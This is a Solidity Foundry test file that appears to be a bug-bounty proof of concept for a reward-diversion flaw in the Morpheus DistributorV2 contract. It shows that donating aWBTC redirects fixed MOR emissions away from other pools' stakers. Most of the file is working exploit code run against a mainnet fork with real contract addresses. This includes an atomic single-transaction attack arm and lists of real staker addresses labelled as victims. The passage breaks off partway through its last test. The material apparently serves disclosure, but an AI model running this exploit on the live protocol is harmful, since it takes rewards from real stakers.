// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

interface IAggregator {
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
    function decimals() external view returns (uint8);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function getDistributedRewards(uint256 rewardPoolIndex_, address depositPoolAddress_)
        external
        view
        returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
    function minRewardsDistributePeriod() external view returns (uint256);
    function depositPools(uint256, address)
        external
        view
        returns (
            address token,
            string memory chainLinkPath,
            uint256 tokenPrice,
            uint256 deposited,
            uint256 lastUnderlyingBalance,
            uint8 strategy,
            address aToken,
            bool isExist
        );
}

/// @title Cross-pool emission capture in Morpheus DistributorV2
/// @notice distributeRewards() splits a fixed MOR emission across five deposit pools in proportion
///         to each pool's measured yield delta: balanceOf(distributor) - lastUnderlyingBalance on
///         the pool's yieldToken. That yieldToken is a plain transferable ERC20, so any unprivileged
///         address can inflate one pool's measured yield and redirect the fixed emission away from
///         every other pool's stakers.
contract DonationShareTest is Test {
    uint256 constant POOL_ID = 0;
    uint256 constant FORK_BLOCK = 25837000;

    address constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    // WBTC whale - Binance 14 hot wallet, holds ~294 BTC at fork block
    address constant WBTC_WHALE = 0x28C6c06298d514Db089934071355E5743bf21d60;

    address constant DP_STETH = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant DP_WETH = 0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384;
    address constant DP_WBTC = 0xdE283F8309Fd1AA46c95d299f6B8310716277A42;
    address constant DP_USDC = 0x6cCE082851Add4c535352f596662521B4De4750E;
    address constant DP_USDT = 0x3B51989212BEdaB926794D6bf8e9E991218cf116;

    // Chainlink feed addresses used by the wBTC/BTC,BTC/USD path
    address constant CL_WBTC_BTC = 0xfdFD9C85aD200c506Cf9e21F1FD8dd01932FBB23;
    address constant CL_BTC_USD = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c;
    // stETH/USD, ETH/USD, USDC/USD, USDT/USD
    address constant CL_STETH_USD = 0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8;
    address constant CL_ETH_USD = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address constant CL_USDC_USD = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;
    address constant CL_USDT_USD = 0x3E7d1eAB13ad0104d2750B8863b489D65364e32D;

    IDistributor dist = IDistributor(DISTRIBUTOR);
    address attacker = makeAddr("attacker");

    address[5] pools = [DP_STETH, DP_WETH, DP_WBTC, DP_USDC, DP_USDT];
    string[5] names = ["stETH", "wETH ", "wBTC ", "USDC ", "USDT "];

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), FORK_BLOCK);
    }

    function _snapshotRewards() internal view returns (uint256[5] memory out) {
        for (uint256 i = 0; i < 5; i++) {
            out[i] = dist.getDistributedRewards(POOL_ID, pools[i]);
        }
    }

    function _warpPastPeriod() internal {
        uint256 period = dist.minRewardsDistributePeriod();
        uint128 lastTs = dist.rewardPoolLastCalculatedTimestamp(POOL_ID);
        uint256 target = uint256(lastTs) + period + 1;
        if (block.timestamp < target) vm.warp(target);
    }

    /// @notice Keep every Chainlink feed answer fresh after a vm.warp.
    ///         Only updatedAt/startedAt are re-stamped; the price answer is left exactly as the
    ///         real feed reported it at the fork block. This is a harness necessity, not part of
    ///         the attack: a forked Chainlink aggregator cannot receive new rounds, so any
    ///         multi-period test must re-stamp freshness or the protocol's own staleness guard
    ///         reverts with "DR: price for pair is zero". On mainnet these feeds update on their
    ///         own heartbeat, so no attacker action is required here.
    function _refreshFeeds() internal {
        address[6] memory feeds = [CL_WBTC_BTC, CL_BTC_USD, CL_STETH_USD, CL_ETH_USD, CL_USDC_USD, CL_USDT_USD];
        for (uint256 i = 0; i < feeds.length; i++) {
            (uint80 roundId, int256 answer,,, uint80 answeredInRound) = IAggregator(feeds[i]).latestRoundData();
            vm.mockCall(
                feeds[i],
                abi.encodeWithSelector(IAggregator.latestRoundData.selector),
                abi.encode(roundId, answer, block.timestamp, block.timestamp, answeredInRound)
            );
        }
    }

    /// @notice Acquire aWBTC legitimately: prank WBTC whale, supply to Aave, receive aWBTC
    function _acquireAWbtc(address recipient, uint256 wbtcAmount) internal returns (address aWBTC) {
        (,,,,,, aWBTC,) = dist.depositPools(POOL_ID, DP_WBTC);

        // Transfer WBTC from whale to attacker
        vm.prank(WBTC_WHALE);
        _checkedTransfer(WBTC, recipient, wbtcAmount);

        // Supply WBTC to Aave to mint aWBTC
        vm.startPrank(recipient);
        IERC20(WBTC).approve(AAVE_POOL, wbtcAmount);
        IAavePool(AAVE_POOL).supply(WBTC, wbtcAmount, recipient, 0);
        vm.stopPrank();
    }

    function _checkedTransfer(address token, address recipient, uint256 amount) internal {
        require(IERC20(token).transfer(recipient, amount), "ERC20 transfer failed");
    }

    function test_donationCapturesEmissionShare() public {
        (,,,,,, address aWBTC,) = dist.depositPools(POOL_ID, DP_WBTC);
        assertTrue(aWBTC != address(0), "wBTC pool must be AAVE strategy");

        uint256[5] memory before = _snapshotRewards();

        // ---------------- CONTROL ARM: no donation ----------------
        uint256 snap = vm.snapshotState();
        _warpPastPeriod();
        dist.distributeRewards(POOL_ID);
        uint256[5] memory ctrl = _snapshotRewards();

        uint256 ctrlTotal;
        for (uint256 i = 0; i < 5; i++) {
            ctrlTotal += ctrl[i] - before[i];
        }

        console.log("=== CONTROL (organic yield only) ===");
        for (uint256 i = 0; i < 5; i++) {
            uint256 d = ctrl[i] - before[i];
            console.log(names[i], d, ctrlTotal == 0 ? 0 : (d * 10000) / ctrlTotal);
        }
        console.log("control total emission distributed:", ctrlTotal);

        // ---------------- ATTACK ARM: donate aWBTC ----------------
        vm.revertToState(snap);

        // Attacker acquires 1.0 WBTC worth of aWBTC via legitimate Aave supply
        uint256 wbtcDonation = 1e8; // 1.0 WBTC = 1e8 satoshi
        _acquireAWbtc(attacker, wbtcDonation);

        // Verify attacker has aWBTC
        uint256 attackerAWbtc = IERC20(aWBTC).balanceOf(attacker);
        assertGt(attackerAWbtc, 0, "attacker must hold aWBTC after Aave supply");
        console.log("attacker aWBTC balance:", attackerAWbtc);

        // Donate aWBTC directly to the Distributor - unprivileged transfer
        vm.prank(attacker);
        _checkedTransfer(aWBTC, DISTRIBUTOR, attackerAWbtc);

        _warpPastPeriod();
        dist.distributeRewards(POOL_ID);
        uint256[5] memory atk = _snapshotRewards();

        uint256 atkTotal;
        for (uint256 i = 0; i < 5; i++) {
            atkTotal += atk[i] - before[i];
        }

        console.log("=== ATTACK (1.0 WBTC worth of aWBTC donated by unprivileged address) ===");
        for (uint256 i = 0; i < 5; i++) {
            uint256 d = atk[i] - before[i];
            console.log(names[i], d, atkTotal == 0 ? 0 : (d * 10000) / atkTotal);
        }
        console.log("attack total emission distributed:", atkTotal);

        uint256 ctrlWbtc = ctrl[2] - before[2];
        uint256 atkWbtc = atk[2] - before[2];

        // The same fixed emission is split; totals must match (within rounding dust).
        uint256 diff = atkTotal > ctrlTotal ? atkTotal - ctrlTotal : ctrlTotal - atkTotal;
        assertLe(diff, 10, "total emission for the period must be unchanged (up to rounding)");

        // INVARIANT BROKEN: wBTC pool's slice rose purely from a donation.
        assertGt(atkWbtc, ctrlWbtc, "donation must increase the wBTC pool slice");

        // The donation captures a majority of the fixed emission.
        assertGt(atkWbtc * 2, atkTotal, "donated pool must capture >50% of the emission");

        // Every other pool must lose emission relative to control.
        for (uint256 i = 0; i < 5; i++) {
            if (i == 2) continue;
            assertLt(atk[i] - before[i], ctrl[i] - before[i], "other pools must lose emission");
        }

        console.log("--- IMPACT SUMMARY ---");
        console.log("wBTC slice control (MOR wei):", ctrlWbtc);
        console.log("wBTC slice attack  (MOR wei):", atkWbtc);
        console.log("emission redirected away from other pools (MOR wei):", atkWbtc - ctrlWbtc);
    }

    /// @notice Full attack lifecycle: stake -> donate -> accrue over 7 days -> claim MOR
    ///         Demonstrates actual value capture by the attacker at the expense of other stakers.
    function test_fullAttackLifecycleValueCapture() public {
        (,,,,,, address aWBTC,) = dist.depositPools(POOL_ID, DP_WBTC);

        // --- Setup: give attacker WBTC for both staking and donation ---
        uint256 stakeAmount = 5e7; // 0.5 WBTC for staking into the pool
        uint256 donationAmount = 1e8; // 1.0 WBTC converted to aWBTC for donation
        uint256 totalWbtc = stakeAmount + donationAmount;

        vm.prank(WBTC_WHALE);
        _checkedTransfer(WBTC, attacker, totalWbtc);

        // --- CONTROL ARM: stake only, no donation ---
        uint256 snap = vm.snapshotState();

        vm.startPrank(attacker);
        IERC20(WBTC).approve(DP_WBTC, stakeAmount);
        IERC20(WBTC).approve(DISTRIBUTOR, stakeAmount);
        IDepositPool(DP_WBTC).stake(POOL_ID, stakeAmount, 0, address(0));
        vm.stopPrank();

        // Distribute rewards daily for 7 periods, warping one period at a time
        // This keeps Chainlink oracle answers fresh (heartbeat <= 86400s)
        for (uint256 d = 0; d < 7; d++) {
            _warpPastPeriod();
            _refreshFeeds();
            dist.distributeRewards(POOL_ID);
        }

        uint256 ctrlReward = IDepositPool(DP_WBTC).getLatestUserReward(POOL_ID, attacker);
        console.log("=== CONTROL: stake only (0.5 WBTC, 7 periods) ===");
        console.log("Claimable MOR (wei):", ctrlReward);

        // --- ATTACK ARM: stake + donate aWBTC each period ---
        vm.revertToState(snap);

        // vm.mockCall persists across revertToState, so stale mocked timestamps from the control
        // arm would fail the protocol's `block.timestamp < updatedAt_` check. Clear them first.
        vm.clearMockedCalls();

        // Attacker stakes 0.5 WBTC into the pool
        vm.startPrank(attacker);
        IERC20(WBTC).approve(DP_WBTC, stakeAmount);
        IERC20(WBTC).approve(DISTRIBUTOR, stakeAmount);
        IDepositPool(DP_WBTC).stake(POOL_ID, stakeAmount, 0, address(0));
        vm.stopPrank();

        // Attacker supplies the remaining 1.0 WBTC to Aave to get aWBTC
        vm.startPrank(attacker);
        IERC20(WBTC).approve(AAVE_POOL, donationAmount);
        IAavePool(AAVE_POOL).supply(WBTC, donationAmount, attacker, 0);
        vm.stopPrank();

        // Donate and distribute each period for 7 periods
        uint256 aWbtcPerDay = IERC20(aWBTC).balanceOf(attacker) / 7;
        for (uint256 d = 0; d < 7; d++) {
            uint256 donateNow = d < 6 ? aWbtcPerDay : IERC20(aWBTC).balanceOf(attacker);
            if (donateNow > 0) {
                vm.prank(attacker);
                _checkedTransfer(aWBTC, DISTRIBUTOR, donateNow);
            }
            _warpPastPeriod();
            _refreshFeeds();
            dist.distributeRewards(POOL_ID);
        }

        uint256 atkReward = IDepositPool(DP_WBTC).getLatestUserReward(POOL_ID, attacker);
        console.log("=== ATTACK: stake + daily donation (0.5 WBTC stake, 1.0 WBTC donated as aWBTC) ===");
        console.log("Claimable MOR (wei):", atkReward);

        // --- Assertions ---
        assertGt(atkReward, ctrlReward, "attacker must earn more MOR with donation");
        assertGt(atkReward, ctrlReward * 10, "attacker reward must be >10x control (proves material capture)");

        console.log("--- VALUE CAPTURE ---");
        console.log("Control reward (MOR wei):", ctrlReward);
        console.log("Attack  reward (MOR wei):", atkReward);
        console.log("Multiplier:", atkReward / (ctrlReward == 0 ? 1 : ctrlReward));
        console.log("Extra MOR captured:", atkReward - ctrlReward);
    }

    /// @notice DECISIVE ARM: real third-party stakers lose claimable MOR.
    ///
    ///         Every other arm measures pool-level accounting. This one measures the thing the
    ///         reward matrix actually pays for: "quantified loss to a subset of users".
    ///
    ///         The six addresses below are real stETH DepositPool stakers, harvested from
    ///         `UserStaked` logs on the deployed pool and confirmed to hold a non-zero
    ///         `getLatestUserReward(0, user)` at the pinned block. None of them is controlled
    ///         by the attacker. No warp, no mock, no privileged account.
    function test_realStakersLoseClaimableMor() public {
        (,,,,,, address aWBTC,) = dist.depositPools(POOL_ID, DP_WBTC);

        address[6] memory victims = [
            0xC1afA4c0A70B622d7b71d42241Bb4d52B6F3E218,
            0x47655C3b13Dd14A54F8AE3cf17CfDA12f7F91cd7,
            0x678bC3C5811f2A2F8F411b3be3842173104F2EA6,
            0xEFd0c6D189f93ED08bfC086267d8b1486D58466d,
            0x76d2DDCe6b781e66c4B184C82Fbf4F94346Cfb0D,
            0x10c4f3f0260fcF457DEABD2201eE1CdBC13E0f9F
        ];

        // Confirm every victim is a live staker with a real claim before touching anything.
        uint256[6] memory rewardBefore;
        for (uint256 i = 0; i < 6; i++) {
            rewardBefore[i] = IDepositPool(DP_STETH).getLatestUserReward(POOL_ID, victims[i]);
            assertGt(rewardBefore[i], 0, "victim must be a real staker with a pending claim");
        }

        uint256 snap = vm.snapshotState();

        // ---- CONTROL: the pending period distributed with no interference ----
        dist.distributeRewards(POOL_ID);
        uint256[6] memory rewardCtrl;
        uint256 ctrlSum;
        for (uint256 i = 0; i < 6; i++) {
            rewardCtrl[i] = IDepositPool(DP_STETH).getLatestUserReward(POOL_ID, victims[i]);
            ctrlSum += rewardCtrl[i] - rewardBefore[i];
        }
        console.log("=== CONTROL: honest distribution, MOR earned this period ===");
        for (uint256 i = 0; i < 6; i++) {
            console.log(rewardCtrl[i] - rewardBefore[i]);
        }
        console.log("sum earned by the six stakers:", ctrlSum);

        // ---- ATTACK: identical state, one unprivileged aWBTC transfer first ----
        vm.revertToState(snap);

        _acquireAWbtc(attacker, 25e5); // 0.025 WBTC
        uint256 sent = IERC20(aWBTC).balanceOf(attacker);
        vm.prank(attacker);
        _checkedTransfer(aWBTC, DISTRIBUTOR, sent);

        dist.distributeRewards(POOL_ID);
        uint256[6] memory rewardAtk;
        uint256 atkSum;
        for (uint256 i = 0; i < 6; i++) {
            rewardAtk[i] = IDepositPool(DP_STETH).getLatestUserReward(POOL_ID, victims[i]);
            atkSum += rewardAtk[i] - rewardBefore[i];
        }
        console.log("=== ATTACK: same period after a 0.025 WBTC donation ===");
        for (uint256 i = 0; i < 6; i++) {
            console.log(rewardAtk[i] - rewardBefore[i]);
        }
        console.log("sum earned by the six stakers:", atkSum);

        // Every single real staker earns strictly less than they would have.
        for (uint256 i = 0; i < 6; i++) {
            assertLt(
                rewardAtk[i] - rewardBefore[i],
                rewardCtrl[i] - rewardBefore[i],
                "each real staker must earn less MOR because of the donation"
            );
        }
        assertLt(atkSum, ctrlSum, "aggregate staker earnings must fall");

        console.log("--- LOSS TO REAL THIRD-PARTY STAKERS (one period, 6 sampled addresses) ---");
        uint256 lost;
        for (uint256 i = 0; i < 6; i++) {
            uint256 delta = (rewardCtrl[i] - rewardBefore[i]) - (rewardAtk[i] - rewardBefore[i]);
            lost += delta;
            console.log(delta);
        }
        console.log("total MOR taken from these six stakers:", lost);
    }

    /// @notice STRONGEST ARM: no vm.warp, no vm.mockCall, no time manipulation at all.
    ///
    ///         At the pinned block 25837000 the distribution gate is already open:
    ///           rewardPoolLastCalculatedTimestamp(0) = 1787611175
    ///           minRewardsDistributePeriod           = 86400
    ///           block.timestamp                      = 1787718551
    ///           elapsed = 107376 > 86400, so `distributeRewards(0)` proceeds immediately.
    ///
    ///         Every Chainlink feed is therefore fresh with its real answer, and the whole
    ///         proof runs against unmodified pinned-block state. The only cheatcodes used
    ///         are vm.prank (to act as an ordinary unprivileged address) and vm.snapshotState
    ///         (to run the control and attack over the identical starting state).
    function test_pinnedBlockNoWarpNoMock_shareDiversion() public {
        (,,,,,, address aWBTC,) = dist.depositPools(POOL_ID, DP_WBTC);

        // Prove the gate is open without touching time.
        uint256 lastCalc = dist.rewardPoolLastCalculatedTimestamp(POOL_ID);
        uint256 period = dist.minRewardsDistributePeriod();
        assertGt(block.timestamp, lastCalc + period, "period gate must already be open at the pinned block");
        console.log("=== PINNED BLOCK, NO WARP, NO MOCK ===");
        console.log("lastCalculatedTimestamp:", lastCalc);
        console.log("minRewardsDistributePeriod:", period);
        console.log("block.timestamp:", block.timestamp);
        console.log("elapsed:", block.timestamp - lastCalc);

        uint256[5] memory before = _snapshotRewards();
        uint256 snap = vm.snapshotState();

        // ---- CONTROL: distribute the pending period untouched ----
        dist.distributeRewards(POOL_ID);
        uint256[5] memory ctrl = _snapshotRewards();
        uint256 ctrlTotal;
        for (uint256 i = 0; i < 5; i++) {
            ctrlTotal += ctrl[i] - before[i];
        }

        console.log("control total emission:", ctrlTotal);
        for (uint256 i = 0; i < 5; i++) {
            console.log(names[i], ctrl[i] - before[i], ((ctrl[i] - before[i]) * 10000) / ctrlTotal);
        }

        // ---- ATTACK: same state, one unprivileged aWBTC transfer first ----
        vm.revertToState(snap);

        uint256 donation = 25e5; // 0.025 WBTC, the calibrated size
        _acquireAWbtc(attacker, donation);
        uint256 sent = IERC20(aWBTC).balanceOf(attacker);
        vm.prank(attacker);
        _checkedTransfer(aWBTC, DISTRIBUTOR, sent);

        dist.distributeRewards(POOL_ID);
        uint256[5] memory atk = _snapshotRewards();
        uint256 atkTotal;
        for (uint256 i = 0; i < 5; i++) {
            atkTotal += atk[i] - before[i];
        }

        console.log("attacker aWBTC donated:", sent);
        console.log("attack total emission:", atkTotal);
        for (uint256 i = 0; i < 5; i++) {
            console.log(names[i], atk[i] - before[i], ((atk[i] - before[i]) * 10000) / atkTotal);
        }

        // Total emission unchanged: this is diversion, not over-issuance.
        uint256 d = atkTotal > ctrlTotal ? atkTotal - ctrlTotal : ctrlTotal - atkTotal;
        assertLe(d, 10, "total emission must be unchanged up to rounding");

        // The donated pool's share rises; every other pool's share falls.
        assertGt(atk[2] - before[2], ctrl[2] - before[2], "donated pool share must rise");
        for (uint256 i = 0; i < 5; i++) {
            if (i == 2) continue;
            assertLt(atk[i] - before[i], ctrl[i] - before[i], "every other pool must lose share");
        }

        console.log("--- DIVERSION AT PINNED BLOCK ---");
        console.log("wBTC gain:", (atk[2] - before[2]) - (ctrl[2] - before[2]));
        console.log("stETH loss:", (ctrl[0] - before[0]) - (atk[0] - before[0]));
        console.log("USDC loss:", (ctrl[3] - before[3]) - (atk[3] - before[3]));
        console.log("USDT loss:", (ctrl[4] - before[4]) - (atk[4] - before[4]));
        console.log("wETH loss:", (ctrl[1] - before[1]) - (atk[1] - before[1]));
    }

    /// @notice NOVELTY CONTROL vs Code4rena 2025-08 Low-01.
    ///
    ///         Low-01 exercises the `totalYield_ == 0` branch (DistributorV2.sol:429-432):
    ///         on a zero-yield day a donation makes totalYield_ non-zero, so `rewards_` is
    ///         minted instead of accruing to `undistributedRewards`. Its impact is EXTRA
    ///         emission on a day that should have had none.
    ///
    ///         This test proves the opposite precondition and a different impact:
    ///           1. organic totalYield_ is already > 0 (a normal yield day), so the
    ///              Low-01 branch is never taken;
    ///           2. total minted emission is UNCHANGED by the donation;
    ///           3. the donation only moves shares inside the loop at :436-442, which
    ///              Low-01 never reaches.
    ///
    ///         Fixing Low-01 (guarding the zero-yield branch) therefore does not fix this.
    function test_noveltyControl_normalYieldDay_totalMintUnchanged() public {
        (,,,,,, address aWBTC,) = dist.depositPools(POOL_ID, DP_WBTC);

        uint256[5] memory before = _snapshotRewards();

        // ---- Establish that organic totalYield_ > 0 WITHOUT any donation ----
        uint256 snap = vm.snapshotState();
        _warpPastPeriod();
        dist.distributeRewards(POOL_ID);
        uint256[5] memory ctrl = _snapshotRewards();

        uint256 ctrlTotal;
        uint256 poolsPaid;
        for (uint256 i = 0; i < 5; i++) {
            uint256 d = ctrl[i] - before[i];
            ctrlTotal += d;
            if (d > 0) poolsPaid++;
        }

        // If totalYield_ had been 0, distributeRewards would have taken the Low-01
        // branch and credited NOTHING to any pool. Multiple pools were credited,
        // so organic totalYield_ > 0 and the Low-01 precondition is absent.
        assertGt(ctrlTotal, 0, "organic emission must be distributed (totalYield_ > 0)");
        assertGe(poolsPaid, 2, "several pools must earn organically on a normal day");
        console.log("=== NOVELTY CONTROL: organic day, no donation ===");
        console.log("pools credited:", poolsPaid);
        console.log("total emission distributed:", ctrlTotal);

        // ---- Same period, now with a donation ----
        vm.revertToState(snap);
        vm.clearMockedCalls();

        uint256 donation = 25e5; // 0.025 WBTC
        _acquireAWbtc(attacker, donation);
        uint256 attackerAWbtc = IERC20(aWBTC).balanceOf(attacker);
        vm.prank(attacker);
        _checkedTransfer(aWBTC, DISTRIBUTOR, attackerAWbtc);

        _warpPastPeriod();
        dist.distributeRewards(POOL_ID);
        uint256[5] memory atk = _snapshotRewards();

        uint256 atkTotal;
        for (uint256 i = 0; i < 5; i++) {
            atkTotal += atk[i] - before[i];
        }

        console.log("=== NOVELTY CONTROL: same period, with donation ===");
        console.log("total emission distributed:", atkTotal);

        // (2) NO extra emission. This is the axis Low-01 is about, and it is untouched.
        uint256 diff = atkTotal > ctrlTotal ? atkTotal - ctrlTotal : ctrlTotal - atkTotal;
        assertLe(diff, 10, "total minted emission must be unchanged (not a Low-01 over-mint)");

        // (3) The share split moved. This is the axis Low-01 does not cover.
        assertGt(atk[2] - before[2], ctrl[2] - before[2], "donated pool share must rise");
        assertLt(atk[0] - before[0], ctrl[0] - before[0], "stETH stakers must lose share");

        console.log("--- DISTINCTION ---");
        console.log("extra emission minted (Low-01 axis):", diff);
        console.log("wBTC share gain (H1 axis):", (atk[2] - before[2]) - (ctrl[2] - before[2]));
        console.log("stETH share loss (H1 axis):", (ctrl[0] - before[0]) - (atk[0] - before[0]));
    }

    /// @notice ATOMIC + PERMANENT ARM: the whole diversion happens in ONE transaction and the
    ///         loss it inflicts on real third-party stakers is never restored in a later period.
    ///
    ///         Two properties this arm proves that the others do not:
    ///
    ///         1. ATOMICITY. The donation and the distribution execute inside a single call to an
    ///            attacker-deployed contract (`AtomicAttacker.attack`). There is no window between
    ///            the two steps, so no staker can react, no keeper can front-run, and the invariant
    ///            break is not an ordering artifact. `distributeRewards` is public; the transfer is
    ///            a plain ERC20 transfer; the contract holds only aWBTC the attacker acquired from
    ///            Aave with its own WBTC. No privileged account of any kind.
    ///
    ///         2. PERMANENCE. The attacker donates in period 1 only, then stops. A second period is
    ///            distributed organically with no further attacker action. The victims' cumulative
    ///            claimable MOR at the end of period 2 remains strictly below the honest control,
    ///            by essentially the whole period-1 diversion. The theft is written into the
    ///            monotonic `distributedRewards` accumulator and to the per-user `rate`, and no code
    ///            path (owner included) reverses it. The donated aWBTC is also unrecoverable: it
    ///            becomes the pool's next `lastUnderlyingBalance` baseline and `_withdrawYield`
    ///            forwards the surplus to `l1Sender`.
    ///
    ///         Victim set: 15 real stETH DepositPool stakers harvested from `UserStaked` logs on
    ///         the deployed pool, each independently confirmed to hold a non-zero
    ///         `getLatestUserReward(0, user)` at the pinned block. None is controlled by the
    ///         attacker.
    function test_atomicBundle_permanentLoss_realVictims() public {
        (,,,,,, address aWBTC,) = dist.depositPools(POOL_ID, DP_WBTC);

        address[15] memory victims = [
            0x0E4b251ae9b2A4BfEdE740faad78e25F59a5746A,
            0x10c4f3f0260fcF457DEABD2201eE1CdBC13E0f9F,
            0x47655C3b13Dd14A54F8AE3cf17CfDA12f7F91cd7,
            0x678bC3C5811f2A2F8F411b3be3842173104F2EA6,
            0x729FB87C4eDa7373Ada4Bb720d2CBAFDbdD83092,
            0x76d2DDCe6b781e66c4B184C82Fbf4F94346Cfb0D,
            0x8Bf5941d27176242745B716251943Ae4892a3C26,
            0xA48f1713A52808d75B1667480C39De98668bFC0C,
            0xb23654f8e6442eDa5265A90988d0FE2825CDdd75,
            0xccF343eeF0c5f2590EE30EFc9F564B33AEb3C7E6,
            0xcFE375d026515C1A45763f9b58EDf2BE0A5bD5e2,
            0xdd5C9e4342962ED8F19653A6B7950Ee2867284Cc,
            0xEFd0c6D189f93ED08bfC086267d8b1486D58466d,
            0xF94A4dF43a85f7FE60EeC2489Df50e5F768B8FD4,
            0xC1afA4c0A70B622d7b71d42241Bb4d52B6F3E218
        ];

        // Confirm every victim is a live staker with a real claim before touching anything.
        uint256 pendingBefore;
        for (uint256 i = 0; i < victims.length; i++) {
            uint256 r = IDepositPool(DP_STETH).getLatestUserReward(POOL_ID, victims[i]);
            assertGt(r, 0, "victim must be a real staker with a pending claim");
            pendingBefore += r;
        }
        console.log("=== ATOMIC + PERMANENT ===");
        console.log("named real stETH victims:", victims.length);
        console.log("their total pending MOR at fork block (wei):", pendingBefore);

        uint256 snap = vm.snapshotState();

        // ---------- CONTROL TIMELINE: two honest periods, no attacker ----------
        // Period 1 (gate already open at the pinned block, no warp, real feeds).
        dist.distributeRewards(POOL_ID);
        // Same-horizon control snapshot: victim cumulative claimable after ONLY period 1.
        // This is the correct comparison point for the atomic single-tx claim below.
        uint256 ctrlSumP1;
        for (uint256 i = 0; i < victims.length; i++) {
            ctrlSumP1 += IDepositPool(DP_STETH).getLatestUserReward(POOL_ID, victims[i]);
        }
        console.log("control: victim cumulative claimable after 1 honest period (wei):", ctrlSumP1);
        // Period 2.
        _warpPastPeriod();
        _refreshFeeds();
        dist.distributeRewards(POOL_ID);

        uint256[15] memory ctrlEnd;
        uint256 ctrlSum;
        for (uint256 i = 0; i < victims.length; i++) {
            ctrlEnd[i] = IDepositPool(DP_STETH).getLatestUserReward(POOL_ID, victims[i]);
            ctrlSum += ctrlEnd[i];
        }
        console.log("control: victim cumulative claimable after 2 honest periods (wei):", ctrlSum);

        // ---------- ATTACK TIMELINE: atomic period-1 diversion, then attacker stops ----------
        vm.revertToState(snap);
        vm.clearMockedCalls();

        // Attacker acquires aWBTC with its own WBTC (legitimate Aave supply) and funds the
        // atomic attack contract. Deployment and funding are ordinary unprivileged actions.
        AtomicAttacker bot = new AtomicAttacker();
        _acquireAWbtc(address(bot), 25e5); // 0.025 WBTC -> aWBTC held by the bot

        uint256 botBal = IERC20(aWBTC).balanceOf(address(bot));
        assertGt(botBal, 0, "atomic bot must hold the donation");

        // PERIOD 1: the entire diversion in a single transaction.
        // One external call performs the donation transfer AND the distribution.
        bot.attack(aWBTC, DISTRIBUTOR, POOL_ID);

        // Snapshot the period-1 damage.
        uint256 atkSumP1;
        for (uint256 i = 0; i < victims.length; i++) {
            atkSumP1 += IDepositPool(DP_STETH).getLatestUserReward(POOL_ID, victims[i]);
        }

        // PERIOD 2: attacker does NOTHING. Organic distribution only.
        _warpPastPeriod();
        _refreshFeeds();
        dist.distributeRewards(POOL_ID);

        uint256[15] memory atkEnd;
        uint256 atkSum;
        for (uint256 i = 0; i < victims.length; i++) {
            atkEnd[i] = IDepositPool(DP_STETH).getLatestUserReward(POOL_ID, victims[i]);
            atkSum += atkEnd[i];
        }
        console.log("attack: victim cumulative claimable after 2 periods, attack only in P1 (wei):", atkSum);

        // ---- ATOMICITY: the diversion already bit after the single-tx call in period 1,
        //      compared against the SAME-HORIZON one-period honest control ----
        assertLt(atkSumP1, ctrlSumP1, "single atomic tx must reduce victim claim vs the one-period honest control");

        // ---- PERMANENCE: every victim is still strictly poorer at the end of period 2,
        //      even though the attacker acted only in period 1 ----
        for (uint256 i = 0; i < victims.length; i++) {
            assertLt(atkEnd[i], ctrlEnd[i], "each victim's cumulative claim must stay below honest control");
        }
        assertLt(atkSum, ctrlSum, "aggregate victim claim must stay permanently below honest control");

        uint256 permanentLoss = ctrlSum - atkSum;
        console.log("--- PERMANENT LOSS TO 15 NAMED VICTIMS (never restored in period 2) ---");
        console.log("honest cumulative (wei):", ctrlSum);
        console.log("post-attack cumulative (wei):", atkSum);
        console.log("permanent MOR taken from these victims (wei):", permanentLoss);
    }

    /// @notice Economic calibration arm: compare a small repeated donation with a same-test
    ///         no-donation control. The test measures extra MOR captured; USD pricing is
    ///         derived independently from pinned on-chain and external market inputs.
    function test_economicCalibrationAttack() public {
        (,,,,,, address aWBTC,) = dist.depositPools(POOL_ID, DP_WBTC);

        uint256 stakeAmount = 5e7; // 0.5 WBTC stake
        uint256 donationPerDay = 25e5; // 0.025 WBTC per period
        uint256 totalWbtc = stakeAmount + donationPerDay * 7;

        vm.prank(WBTC_WHALE);
        _checkedTransfer(WBTC, attacker, totalWbtc);

        uint256 snap = vm.snapshotState();

        // CONTROL: same stake and seven periods without donation.
        vm.startPrank(attacker);
        IERC20(WBTC).approve(DP_WBTC, stakeAmount);
        IERC20(WBTC).approve(DISTRIBUTOR, stakeAmount);
        IDepositPool(DP_WBTC).stake(POOL_ID, stakeAmount, 0, address(0));
        vm.stopPrank();

        for (uint256 d = 0; d < 7; d++) {
            _warpPastPeriod();
            _refreshFeeds();
            dist.distributeRewards(POOL_ID);
        }
        uint256 controlReward = IDepositPool(DP_WBTC).getLatestUserReward(POOL_ID, attacker);

        // ATTACK: same initial state, same stake, plus repeated aWBTC donations.
        vm.revertToState(snap);
        vm.clearMockedCalls();

        vm.startPrank(attacker);
        IERC20(WBTC).approve(DP_WBTC, stakeAmount);
        IERC20(WBTC).approve(DISTRIBUTOR, stakeAmount);
        IDepositPool(DP_WBTC).stake(POOL_ID, stakeAmount, 0, address(0));
        vm.stopPrank();

        uint256 remainWbtc = IERC20(WBTC).balanceOf(attacker);
        vm.startPrank(attacker);
        IERC20(WBTC).approve(AAVE_POOL, remainWbtc);
        IAavePool(AAVE_POOL).supply(WBTC, remainWbtc, attacker, 0);
        vm.stopPrank();

        uint256 totalDonated;
        for (uint256 d = 0; d < 7; d++) {
